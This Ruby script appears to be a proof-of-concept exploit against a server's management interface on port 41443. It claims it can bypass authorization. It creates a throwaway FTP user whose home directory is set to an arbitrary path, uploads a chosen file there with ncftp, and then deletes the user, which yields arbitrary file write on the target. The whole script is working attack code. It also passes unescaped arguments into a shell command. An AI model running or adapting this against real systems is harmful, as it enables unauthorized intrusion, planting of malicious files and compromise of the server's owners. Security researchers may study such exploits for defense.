require './librhea.rb'

if ARGV.length < 3 || ARGV.length == 4
  $stderr.puts 'Usage:'
  $stderr.puts
  $stderr.puts "#{$1} <target ip> <local file path> <remote file path> [username] [password]"
  $stderr.puts
  $stderr.puts "(If username:password are omitted, we attempt to bypass authorization)"
  exit 1
end

# Set things up
TARGET = ARGV[0]
LOCAL_FILE  = ARGV[1]

REMOTE_FILENAME = '' + ARGV[2]

# Handle Windows paths by changing the '\'s to '/'s and back
if REMOTE_FILENAME.include?('\\') || REMOTE_FILENAME.start_with?('c:')
  REMOTE_FILENAME.gsub!(/\\/, '/')
  REMOTE_PATH, REMOTE_FILE = File.split(REMOTE_FILENAME)
  REMOTE_PATH.gsub!(/\//, '\\')
else
  REMOTE_PATH, REMOTE_FILE = File.split(REMOTE_FILENAME)
end

USERNAME    = ARGV[3]
PASSWORD    = ARGV[4]

BASE_URL = "https://#{ARGV[0]}:41443"
puts "Establishing a session on #{BASE_URL}"
RHEA = LibRhea::new(BASE_URL, USERNAME, PASSWORD)

# Generate random creds
NEW_USERNAME = (0...16).map { (0x61 + rand(26)).chr }.join
NEW_PASSWORD = (0...16).map { (0x61 + rand(26)).chr }.join

# Create a new user with those creds
puts
puts "Creating a user (username = #{NEW_USERNAME}, password = #{NEW_PASSWORD}, home_dir = #{REMOTE_PATH})..."
NEW_UUID = RHEA.create_user(
  username: NEW_USERNAME,
  password: NEW_PASSWORD,
  home_dir: REMOTE_PATH,
)
puts
puts "User created with uuid = #{NEW_UUID})"

# This uses the ncftp CLI to upload a file. That's not the _best_ way, but it
# works
puts "Uploading #{LOCAL_FILE} to #{REMOTE_PATH}/#{REMOTE_FILE}"
out = `echo 'put -z #{LOCAL_FILE} #{REMOTE_FILE}' | ncftp -u '#{NEW_USERNAME}' -p '#{NEW_PASSWORD}' '#{TARGET}' 2>/dev/null`

if out =~ /Requested action not taken/im
  $stderr.puts
  $stderr.puts "!! Something went wrong uploading the file! This usually happens because you can't use the same home directory twice without restarting the server process"
elsif out =~ /was not accepted/im
  $stderr.puts
  $stderr.puts "!! Something went wrong uploading the file! The FTP username/password didn't work, which means the user didn't get created"
else
  puts
  puts "File likely uploaded! Deleting the new user..."
end

RHEA.delete_user(
  username: NEW_USERNAME,
  uuid: NEW_UUID,
)
